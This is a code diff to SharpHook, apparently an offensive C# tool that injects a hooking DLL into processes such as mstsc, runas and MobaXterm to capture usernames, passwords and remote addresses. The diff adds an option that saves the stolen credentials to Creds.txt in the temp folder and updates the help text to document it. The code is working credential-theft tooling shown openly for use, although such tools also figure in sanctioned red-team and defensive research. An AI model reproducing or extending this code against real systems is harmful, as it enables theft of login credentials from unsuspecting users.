@@ -12,10 +12,12 @@ namespace SharpHook
 {
     public class Program
     {
+
         public static void Main(string[] args)
         {
+
             List<string> SupportedProcesses = new List<string>();
-           
+            
 
             try
             {
@@ -34,7 +36,17 @@ namespace SharpHook
                     Console.ResetColor();
                     return;
                 }
-
+                if (arguments.Arguments.ContainsKey("-f"))
+                {
+                    var TrueOrFalse = arguments.Arguments["-f"];
+                    if (TrueOrFalse == "true")
+                    {
+                        Console.WriteLine("[+] Writing output to Creds.txt inside the temp folder");
+                        string Temp = Path.GetTempPath();
+                        File.WriteAllText(Temp + "filepath.txt", Temp + "Creds.txt");
+                    }
+                    
+                }
                 if (arguments.Arguments.ContainsKey("showhelp"))
                 {
                     DisplayHelp("Usage:");
@@ -45,6 +57,7 @@ namespace SharpHook
                     DisplayHelp("Usage:");
                     return;
                 }
+                
                 if (arguments.Arguments.ContainsKey("-p"))
                 {
                     var ProcessName = arguments.Arguments["-p"];
@@ -107,7 +120,7 @@ namespace SharpHook
             // Will contain the name of the IPC server channel
             string channelName = null;
 
-            //List of processes to check for mstsc
+            //List of processes
             List<Process> processes = new List<Process>();
 
             //List of PIDs to check if injected processes have exited
@@ -122,7 +135,8 @@ namespace SharpHook
 
             //This is were Fody saves it's Dlls. 
             string[] files = Directory.GetFiles(TempFolder+@"Costura", "powerhook.dll", SearchOption.AllDirectories);
-           
+
+
             EasyHook.RemoteHooking.IpcCreateServer<PowerHook.ServerInterface>(ref channelName, System.Runtime.Remoting.WellKnownObjectMode.Singleton);
 
             // Get the full path to the assembly we want to inject into the target process
@@ -156,6 +170,7 @@ namespace SharpHook
                                     injectionLibrary,   // 64-bit library to inject (if target is 64-bit)
                                     channelName         // the parameters to pass into injected library
                                     );
+
                                 injectedProcesses.Add(processes[i].Id);
 
 
@@ -200,6 +215,7 @@ namespace SharpHook
 
              ");
             Console.WriteLine("{0} \r\nSharpHook.exe -p=<Process name>", message);
+            Console.WriteLine("SharpHook.exe -p=<Process name> -f=true\r\n");
             Console.WriteLine("SharpHook.exe -p=<Process name1>,<Process name2>,<Process name3>\r\n");
             Console.WriteLine("Examples:");
             Console.WriteLine("SharpHook.exe -p=mstsc - This will hook into mstsc and should give you Username, Password and the remote ip");
@@ -208,6 +224,7 @@ namespace SharpHook
             Console.WriteLine("SharpHook.exe -p=MobaXterm - This will hook into MobaXterm and should give you credentials for SSH and RDP logins");
             Console.WriteLine("SharpHook.exe -p=mstsc,runas - This will hook into mstsc and runas as well");
             Console.WriteLine("SharpHook.exe -p=all - This will hook into every supported process");
+            Console.WriteLine(@"SharpHook.exe -p=mstsc -f=true - This will save the output to a local file inside the temp directory");
             return;
         }
     }
